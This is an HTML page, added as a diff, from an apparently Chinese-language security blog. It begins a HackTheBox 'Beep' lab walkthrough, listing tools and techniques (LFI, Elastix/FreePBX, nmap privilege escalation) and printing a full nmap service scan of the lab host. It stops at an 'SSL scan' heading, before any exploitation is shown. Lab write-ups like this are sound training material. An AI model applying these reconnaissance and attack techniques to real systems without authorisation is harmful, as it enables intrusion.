@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          HTB:Beep-walkthrough - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-04-07&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">2.5k</span>
+  
+  <h1 id="HTB-Beep-Walkthrough">HTB::Beep Walkthrough</h1>
+<h2 id="0x01-Info-Card">0x01 Info Card</h2>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407181830.png" alt=""></p>
+<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
+<ul>
+<li>nmap</li>
+<li>sslscan</li>
+<li>wfuzz</li>
+<li>vtigercrm</li>
+<li>LFI</li>
+<li>Elastix / FreeFBX</li>
+<li>Nmap Privilege Escalation</li>
+</ul>
+<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
+<h3 id="Initial-Enumeration">Initial Enumeration</h3>
+<p>端口扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Tue Apr  7 03:18:33 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.7</span><br><span class="line">Nmap scan report for 10.10.10.7</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 987 closed ports</span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)</span><br><span class="line">|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)</span><br><span class="line">25&#x2F;tcp    open  smtp       Postfix smtpd</span><br><span class="line">|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">80&#x2F;tcp    open  http       Apache httpd 2.2.3</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.3 (CentOS)</span><br><span class="line">|_http-title: Did not follow redirect to https:&#x2F;&#x2F;10.10.10.7&#x2F;</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">110&#x2F;tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4</span><br><span class="line">|_pop3-capabilities: TOP APOP UIDL IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) STLS RESP-CODES AUTH-RESP-CODE USER EXPIRE(NEVER) PIPELINING</span><br><span class="line">111&#x2F;tcp   open  rpcbind    2 (RPC #100000)</span><br><span class="line">143&#x2F;tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4</span><br><span class="line">|_imap-capabilities: THREAD&#x3D;REFERENCES ATOMIC Completed MAILBOX-REFERRALS OK RENAME LISTEXT LITERAL+ MULTIAPPEND X-NETSCAPE LIST-SUBSCRIBED CHILDREN UNSELECT RIGHTS&#x3D;kxte URLAUTHA0001 IDLE IMAP4rev1 SORT&#x3D;MODSEQ ID BINARY IMAP4 CONDSTORE CATENATE SORT ANNOTATEMORE NO UIDPLUS STARTTLS ACL NAMESPACE THREAD&#x3D;ORDEREDSUBJECT QUOTA</span><br><span class="line">443&#x2F;tcp   open  ssl&#x2F;https?</span><br><span class="line">|_ssl-date: 2020-04-07T07:23:36+00:00; +1m25s from scanner time.</span><br><span class="line">880&#x2F;tcp   open  status     1 (RPC #100024)</span><br><span class="line">993&#x2F;tcp   open  ssl&#x2F;imap   Cyrus imapd</span><br><span class="line">|_imap-capabilities: CAPABILITY</span><br><span class="line">995&#x2F;tcp   open  pop3       Cyrus pop3d</span><br><span class="line">3306&#x2F;tcp  open  mysql      MySQL (unauthorized)</span><br><span class="line">4445&#x2F;tcp  open  upnotifyp?</span><br><span class="line">10000&#x2F;tcp open  http       MiniServ 1.570 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).</span><br><span class="line">Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1m24s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Tue Apr  7 03:24:47 2020 -- 1 IP address (1 host up) scanned in 374.24 seconds</span><br></pre></td></tr></table></figure>
+<p>SSL scan</p>
